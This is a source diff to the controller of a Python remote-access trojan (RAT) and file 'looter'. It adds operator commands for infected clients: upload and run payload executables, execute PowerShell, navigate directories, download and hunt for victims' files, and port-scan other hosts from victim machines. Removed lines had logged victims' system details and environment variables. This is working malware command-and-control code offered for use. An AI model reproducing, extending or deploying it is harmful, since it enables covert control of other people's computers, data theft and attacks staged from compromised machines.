@@ -137,6 +137,10 @@ class BasicControler:
         if len(cmd) == 0:
             return None
         return cmd
+    
+    def makeSysMsg(self, cmd : list) -> str:
+        msg = self.headers + self.headers.join(cmd) + self.headers
+        return msg
   
     def _sysCMD(self, msg: str, handler: object) -> None:
         self.server.Msg(f"SYS MSG:{msg}", sender=handler.ID, dev=True)
@@ -185,15 +189,8 @@ class BasicControler:
     def hilfe(self) -> str:
         hilfe = ""
         hilfe += f"\n***************{self.server.SERV_TYPE} HELP ****************************\n"
-        hilfe += "ss serv start        - Start Server Listening\n"
-        hilfe += "ss serv stop         - Stop Server Listening\n"
-        hilfe += "ss serv conf         - Show Config Server\n"
-        hilfe += "ss serv admin on     - Enable Http Admin Function\n"
-        hilfe += "ss serv admin off    - Disable Http Admin Function\n"
-        hilfe += "ss cli show          - Show All connected clients\n"
-        hilfe += "ss cli send <cli_ID> <msg>   - Send message or command to client\n"
-        hilfe += "ex: ss cli send 4 Hello      - Send Hello to client no 4\n"
-        hilfe += "ex: ss cli send all Hello    - Send Hello to all clients\n"
+        hilfe += "  ss serv admin on     - Enable Http Admin Function\n"
+        hilfe += "  ss serv admin off    - Disable Http Admin Function\n"
         return hilfe
     
     def help(self) -> str:
@@ -255,67 +252,6 @@ class LooterControler(BasicControler):
         super().__init__(pipe, server_callback)
         self.name = "GypsyKing Controler"
 
-    # def setCoordinates(self, fname: str, flen: str, handler: object, dir_index: str = None) -> None:
-    #     if dir_index:
-    #         dir_index = self.tagMAP.get(dir_index)
-    #         if not dir_index:
-    #             return
-    #     try:
-    #         flen = int(flen)
-    #     except (ValueError, TypeError):
-    #         self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
-    #         return
-    #     if dir_index:
-    #         xtra = self._xtraServ(self.server, flen, fname, dir_index)
-    #     else:
-    #         xtra = self._xtraServ(self.server, flen, fname)
-    #     self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
-    #     handler.sendMsg(f"1 {str(xtra.port)}")
-
-    
-    # def prepareWorkplace(self, tag: str, info: str, index_number: str) -> None:
-    #     tagDir = os.path.join(self.server._oldConf["OUTPUT_DIR"], self.server.name, tag)
-    #     if not os.path.exists(tagDir):
-    #         os.mkdir(tagDir)
-    #     number = str(len(os.listdir(tagDir)) + 1)
-    #     newDir = os.path.join(tagDir, f"{tag}{number}")
-    #     try:
-    #         os.mkdir(newDir)
-    #         with open(os.path.join(newDir, "0000000000000_CLIENT_INFO_0000000000000000.txt"), "w") as f:
-    #             f.write(info)
-    #     except:
-    #         return None
-    #     self.tagMAP[index_number] = newDir
-    
-    # def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
-    #     cliInfo = f" ************ {tag} *********\n"
-    #     cliInfo += f"--------- {info} -----------\n"
-    #     cliInfo += f"Address: {handler.Addr}\n"
-    #     cliInfo += f"Worm Name: {handler.CliName}\n"
-    #     cliInfo += f"Os System: {handler.Os}\n"
-    #     cliInfo += f"Processor: {handler.procInfo}\n"
-    #     cliInfo += f"Platform: {handler.platformInfo}\n"
-    #     cliInfo += f"Network Name: {handler.networkName}\n"
-    #     cliInfo += "\n\n\n"
-    #     cliInfo += handler.EnvVar
-    #     return cliInfo
-    
-    # def uploadFile(self, cliID: str, file_name: str) -> None:
-    #     if not self.server.is_listening:
-    #         self.server.Msg("[!!] ERROR: Server not listening [!!]")
-    #         return
-    #     fpath = os.path.join(self.server.config["PAYLOAD_DIR"], file_name)
-    #     if not os.path.exists(fpath):
-    #         self.server.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
-    #         return
-    #     file_len = os.stat(fpath).st_size
-    #     xtra = self._xtraServ(server_callback=self.server, file_name=file_name, work="upload")
-    #     self.server.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
-    #     self.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
-        
-        
-
-    
     def sysCMD(self, cmd: list, handler: object) -> None:
         match cmd[0]:
             case "d":
@@ -341,3 +277,107 @@ class LooterControler(BasicControler):
                 self.server.uploadFile(cmd[1], cmd[2])
             case _:
                 self.server.Msg("Unknown Command")
+    
+    def help(self) -> str:
+        hilfe = "\n*************** Looter Commands ********************\n"
+        hilfe += "  ss up <cli_ID> <file_name>        - Upload file to client. File must be in payload dir\n"
+        hilfe += "  ex: ss up 3 payload.exe           - Upload payload.exe to client no.3\n"
+        return self.hilfe() + hilfe
+    
+
+
+
+class RatControler(BasicControler):
+    def __init__(self, pipe : Pipe, server_callback: object):
+        super().__init__(pipe, server_callback)
+        self.name = "RAT Controler"
+
+    def sysCMD(self, cmd: list, handler: object) -> None:
+        match cmd[0]:
+            case "d":
+                if len(cmd) == 3:
+                    self.server.setCoordinates(cmd[1], cmd[2], handler)
+                elif len(cmd) == 4:
+                    self.server.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
+                else:
+                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
+
+            case "w":
+                if len(cmd) < 4:
+                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
+                    return
+                clinfo = self.server.prepareReadMe(cmd[1], cmd[2], handler)
+                self.server.prepareWorkplace(cmd[1], clinfo, cmd[3])
+            case _:
+                self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
+    
+    def scan(self, cmd: list) -> None:
+        if len(cmd) == 3:
+            msg = self.makeSysMsg(["SP", cmd[1], cmd[2]])
+            self.sendMsg2Client(cmd[0], msg)
+        elif len(cmd) == 4:
+            msg = self.makeSysMsg(["SP", cmd[1], cmd[2], cmd[3]])
+            self.sendMsg2Client(cmd[0], msg)
+        else:
+            self.server.Msg("[!!] Wrong Scan Command [!!]")
+    
+    def shellCmd(self, cmd: list) -> None:
+        msg = self.makeSysMsg(cmd[1:])
+        self.sendMsg2Client(cmd[0], msg)
+    
+    def psCmd(self, cmd: list) -> None:
+        msg = self.makeSysMsg(["ps"] + cmd[1:])
+        self.sendMsg2Client(cmd[0], msg)
+    
+    def downFile(self, cmd: list) -> None:
+        msg = self.makeSysMsg(["send"] + [cmd[1]])
+        self.sendMsg2Client(cmd[0], msg)
+    
+    def huntFile(self, cmd: list) -> None:
+        msg = self.makeSysMsg(["hunt"] + [cmd[1]])
+        self.sendMsg2Client(cmd[0], msg)
+    
+    def execCMD(self, cmd: list) -> None:
+        match cmd[0]:
+            case "up":
+                self.server.uploadFile(cmd[1], cmd[2])
+            case "scan":
+                self.scan(cmd[1:])
+            case "run":
+                if len(cmd) < 3:
+                    return
+                msg = self.makeSysMsg(["RUN", cmd[2]])
+                self.sendMsg2Client(cmd[1], msg)
+            case "shell":
+                self.shellCmd(cmd[1:])
+            case "ps":
+                self.psCmd(cmd[1:])
+            case "down":
+                self.downFile(cmd[1:])
+            case "hunt":
+                self.huntFile(cmd[1:])
+
+
+            case _:
+                self.server.Msg("Unknown Command")
+    
+    def help(self) -> str:
+        hilfe = "\n*************** SigmaRAT Commands ********************\n"
+        hilfe += "  ss up <cli_ID> <file_name>                        - Upload file to client. File must be in payload dir\n"
+        hilfe += "  ex: ss up 3 payload.exe                           - Upload payload.exe to client no.3\n"
+        hilfe += "  ss down <cli_ID> <file_name>                      - Download file from client. See OUTPUT manual dir\n"
+        hilfe += "  ex: ss down 4 image.jpg                           - Download file image.jpg from client no.4\n"
+        hilfe += "  ss scan <cli_ID> <port_min> <port_max>            - Start scanning ports on client machine: port_min - port_max\n"
+        hilfe += "  ex: ss scan 1 10 2000                             - Start scanning ports 10 - 2000 on clients no.1\n"
+        hilfe += "  ss scan <cli_ID> <port_min> <port_max> <host>     - Start scanning ports on target host from clients machine\n"
+        hilfe += "                                                    - you can put ip addrress or target site (ex: www.google.com)\n"
+        hilfe += "  ex: ss scan 3 19 64000 192.168.2.22               - Start scaning ports 19 - 64000 on machine ip 192.168.2.22 from client no.3\n"
+        hilfe += "  ex: ss scan 3 1 500 www.google.com                - Start scanning ports 1 - 500 on google.com from client no.3\n"
+        hilfe += "  ss shell <cli_ID> cd <dir_name>                   - Change directory on target clients\n"
+        hilfe += "  ex: ss shell 5 cd c:/windows                      - Change directory to windows on client no.5\n"
+        hilfe += "  ss shell <cli_ID> pwd                             - Show actual directory on target client\n"
+        hilfe += "  ss run <cli_ID> <file_name>                       - Run file (like exe) on target client\n"
+        hilfe += "  ex: ss run 1 payload.exe                          - Run payload.exe on client no.1\n"
+        hilfe += "  ss ps <cli_ID> <command>                          - Execute command in WindowsPowerShell on target client\n"
+
+        return self.hilfe() + hilfe
